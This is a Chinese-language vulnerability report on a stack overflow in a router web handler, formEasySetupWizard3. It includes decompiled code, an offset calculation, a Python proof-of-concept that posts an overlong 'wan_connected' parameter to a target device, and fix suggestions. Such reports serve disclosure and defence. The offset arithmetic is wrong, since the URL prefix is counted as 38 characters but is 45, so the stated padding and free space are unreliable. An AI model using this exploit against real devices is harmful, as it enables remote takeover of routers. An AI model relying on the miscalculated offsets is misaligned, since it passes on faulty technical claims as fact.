# formEasySetupWizard3 栈溢出漏洞分析报告

## 漏洞概览 (Executive Summary)

- **漏洞类型**: 栈缓冲区溢出 (Stack Buffer Overflow)
- **风险等级**: 高危 (High)
- **受影响函数**: `formEasySetupWizard3` (地址: 0x457104)
- **触发条件**: 通过HTTP POST请求发送超长的`wan_connected`参数

## 漏洞详情 (Vulnerability Details)

### 代码片段

```c
int __fastcall formEasySetupWizard3(_DWORD *a1)
{
  _BYTE *Var; // $s1
  int v2; // $s1
  _BYTE *v3; // $s0
  int v4; // $a0
  _BYTE *v5; // $s1
  int v6; // $v0
  bool v7; // dc
  int v8; // $s0
  int v9; // $v0
  int v10; // $s1
  int v11; // $v0
  const char *v12; // $v0
  _BYTE v14[200]; // [sp+18h] [-140h] BYREF
  _BYTE v15[24]; // [sp+E0h] [-78h] BYREF
  int v16; // [sp+F8h] [-60h] BYREF
  int v17; // [sp+FCh] [-5Ch] BYREF
  int v18; // [sp+100h] [-58h] BYREF
  int v19; // [sp+104h] [-54h] BYREF
  int v20; // [sp+108h] [-50h] BYREF
  int v21; // [sp+10Ch] [-4Ch] BYREF
  int v22; // [sp+110h] [-48h] BYREF
  _DWORD v23[17]; // [sp+114h] [-44h] BYREF

  v20 = 0;
  v21 = 0;
  v19 = 0;
  websGetVar(a1, (int)"curTime", (int)&dword_48AED4); // 0x457160
  apmib_get(302, &v16); // 0x457178
  if ( !v16 )
  {
    v16 = 1;
    apmib_set(302, &v16);
  }
  Var = (_BYTE *)websGetVar(a1, (int)"config.wireless.SSID", (int)&dword_48AED4); // 0x4571c8
  if ( *Var )
  {
    strcpy(pWizMib + 935, Var); // 0x4571ec
    apmib_set(1, pWizMib + 935);
  }
  v2 = websGetVar(a1, (int)"security_type_radio", (int)&dword_48AED4); // 0x457238
  v3 = (_BYTE *)websGetVar(a1, (int)"config.wlan_password", (int)&dword_48AED4); // 0x457260
  if ( atoi(v2) == 1 )
  {
    v20 = 6;
    if ( *v3 )
    {
      apmib_set(30, v3);
      apmib_set(307, v3);
    }
    v18 = 12;
    v17 = 34;
    v19 = 1;
    apmib_set(304, &v17);
    apmib_set(305, &v18);
    apmib_set(306, &v19);
    v19 = 3;
    apmib_set(29, &v19);
    v4 = 28;
    v19 = 2;
  }
  else
  {
    v19 = 1;
    v20 = 0;
    apmib_set(304, &v19);
    apmib_set(305, &v19);
    v4 = 306;
  }
  apmib_set(v4, &v19);
  apmib_set(25, &v20);
  v5 = (_BYTE *)websGetVar(a1, (int)"config.wireless.ieee8021x_enabled", (int)&dword_48AED4); // 0x4573cc
  v6 = 2;
  if ( *v5 )
  {
    v7 = strcmp(v5, "true") == 0;
    v6 = 1;
    if ( !v7 )
      v6 = 2;
  }
  v21 = v6;
  apmib_set(28, &v21);
  system("echo 4 > /proc/gpio"); // 0x45742c
  v8 = apmib_update(4); // 0x457450
  system("echo 5 > /proc/gpio"); // 0x457460
  if ( v8 )
  {
    save_cs_to_file(); // 0x45747c
    v9 = fopen("/var/run/hnap.pid", "r"); // 0x45749c
    v10 = v9;
    if ( v9 )
    {
      fgets(v15, 20, v9); // 0x4574c0
      if ( sscanf(v15, "%d", &v22) && v22 >= 2 )
        kill(v22, 17); // 0x457510
      fclose(v10); // 0x457528
    }
  }
  v23[0] = 0;
  apmib_get(708, v23); // 0x457544
  v11 = websGetVar(a1, (int)"config.submitflag", (int)&dword_48AED4); // 0x457564
  if ( strcmp("current", v11) )
  {
    v23[5] = *(_DWORD *)"omplete.asp";
    v23[6] = *(_DWORD *)"sy_complete.asp" >> 8;
    v23[7] = *(_DWORD *)"omplete.asp" >> 8;
    v23[8] = (unsigned __int8)aBasicWizardEas_5[24];
    v23[9] = *(unsigned __int16 *)"ete.asp";
    v23[10] = *(_DWORD *)"ete.asp" >> 8;
    v23[11] = (unsigned __int8)aBasicWizardEas_5[28];
    v23[12] = *(unsigned __int16 *)"asp";
    v23[13] = *(_DWORD *)"asp" >> 8;
    strcpy(last_url, "/Basic/Wizard_Easy_complete.asp"); // 0x457794
  }
  else
  {
    v23[1] = *(_DWORD *)"urrent.asp";
    v23[2] = *(_DWORD *)"sy_current.asp" >> 8;
    v23[15] = (unsigned __int8)aBasicWizardEas_4[24];
    v23[3] = *(unsigned __int16 *)"nt.asp";
    v23[4] = *(_DWORD *)"nt.asp" >> 8;
    strcpy(last_url, "/Basic/Wizard_Easy_current.asp"); // 0x457634
  }
  run_init_script("bridge"); // 0x457858
  v12 = (const char *)websGetVar(a1, (int)"wan_connected", (int)&dword_48AED4); // 0x457878
  sprintf(v14, "%s%s", "/Basic/Wizard_Easy_Wlan_Ping.asp?time=4&mode=", v12); // 0x45789c
  return websRedirect(a1, v14); // 0x4578e8
}
```

### 根因分析

漏洞发生在函数的末尾，当使用`sprintf`函数将`v12`变量（来自HTTP参数`wan_connected`）格式化到缓冲区`v14`时：

1. **缓冲区大小**: `v14`声明为`_BYTE v14[200]`，即200字节
2. **格式化字符串**: `"/Basic/Wizard_Easy_Wlan_Ping.asp?time=4&mode="`占用38字节
3. **可用空间**: 200 - 38 = 162字节
4. **问题**: `v12`变量来自用户可控的HTTP参数`wan_connected`，没有长度限制，攻击者可以发送超过162字节的超长字符串

当`v12`长度超过162字节时，`sprintf`会继续写入，覆盖栈上的其他变量，包括：
- `v15` (24字节)
- `v16` (4字节)
- `v17` (4字节)
- `v18` (4字节)
- `v19` (4字节)
- `v20` (4字节)
- `v21` (4字节)
- `v22` (4字节)
- `v23` (68字节)
- 保存的返回地址

## 利用分析 (Exploitation Analysis)

### 偏移量计算

根据栈帧布局：
- `v14`起始偏移: 0x18 (从SP开始)
- 保存的返回地址偏移: 0x158 (从SP开始)
- **Offset (偏移量)**: 0x158 - 0x18 = 0x140 = 320字节

但是，由于`sprintf`格式化字符串占用了38字节，实际需要填充的偏移量为：
- 实际填充: 320 - 38 = 282字节

### 利用路径

1. 攻击者发送HTTP POST请求到`/formEasySetupWizard3`
2. 请求中包含超长的`wan_connected`参数
3. `sprintf`将超长字符串复制到栈缓冲区`v14`
4. 溢出覆盖保存的返回地址
5. 函数返回时跳转到攻击者控制的地址

### Payload 构造

```python
import requests

# 计算偏移量
# v14缓冲区偏移: 0x18
# 返回地址偏移: 0x158
# Offset = 0x158 - 0x18 = 320字节
# 减去格式化字符串长度: 320 - 38 = 282字节

OFFSET = 282
# 替换为实际的返回地址（需要ROP链或shellcode地址）
RETURN_ADDRESS = b'\x00\x00\x00\x00'  # 示例地址

payload = b'A' * OFFSET + RETURN_ADDRESS

# 构造HTTP请求
url = "http://target-ip/formEasySetupWizard3"
data = {
    "wan_connected": payload.decode('latin1'),
    "config.wireless.SSID": "TestSSID",
    "security_type_radio": "0",
    "config.submitflag": "current"
}

response = requests.post(url, data=data)
print(response.text)
```

## 结论与建议 (Conclusion & Mitigation)

### 修复建议

1. **使用安全的字符串函数**: 将`sprintf`替换为`snprintf`，限制写入长度
   ```c
   snprintf(v14, sizeof(v14), "/Basic/Wizard_Easy_Wlan_Ping.asp?time=4&mode=%s", v12);
   ```

2. **输入验证**: 对`wan_connected`参数进行长度检查
   ```c
   if (strlen(v12) > 160) {
       strcpy(&err_msg, "wan_connected parameter too long");
       return -1;
   }
   ```

3. **开启编译保护**:
   - 启用栈保护 (Stack Canaries)
   - 启用地址空间布局随机化 (ASLR)
   - 启用数据执行保护 (DEP/NX)

4. **使用现代Web框架**: 考虑使用具有内置输入验证的Web框架，避免手动处理HTTP参数。

### 影响范围

此漏洞允许未经身份验证的远程攻击者通过特制的HTTP请求在目标设备上执行任意代码，可能导致：
- 设备完全被控制
- 敏感信息泄露
- 拒绝服务攻击
- 作为跳板攻击内网其他设备

### 额外注意事项

该函数还包含另一个潜在的栈溢出点：
```c
strcpy(pWizMib + 935, Var); // 0x4571ec
```
其中`Var`来自`config.wireless.SSID`参数，如果`pWizMib + 935`指向的缓冲区大小不足，也可能导致溢出。建议同时检查并修复此问题。